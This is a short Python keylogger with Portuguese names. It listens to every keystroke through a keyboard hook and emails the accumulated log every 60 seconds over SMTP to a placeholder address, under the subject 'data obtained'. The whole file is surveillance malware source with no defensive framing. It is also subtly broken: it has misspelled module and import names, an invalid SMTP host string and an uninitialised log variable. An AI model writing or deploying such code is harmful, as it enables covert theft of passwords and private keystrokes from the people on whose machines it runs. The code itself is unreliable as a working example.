from pyput import keyboard
import smtplib
from email.mime.txt import MIMEText
from threading import Timer

EMAIL_ORIGEM = "examplo@exemplo.com"
EMAIL_DESTINO = "examplo1@exemplo.com"
SENHA_EMAIL = "123456"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg["SUBJECT"] = "DADOS OBITIDOS"
        msg["From"] = EMAIL_ORIGEM
        msg["To"] = EMAIL_DESTINO
    try:
        server = smtplib.SMTP("smtp@gmail.com", 587)
        server.starttls()
        server.login(EMAIL_ORIGEM, SENHA_EMAIL)
        server.send_message(msg)
        server.quit()
    except Exception as e:
        print ("Erro ao enviar", e)

    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        else:
            pass

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()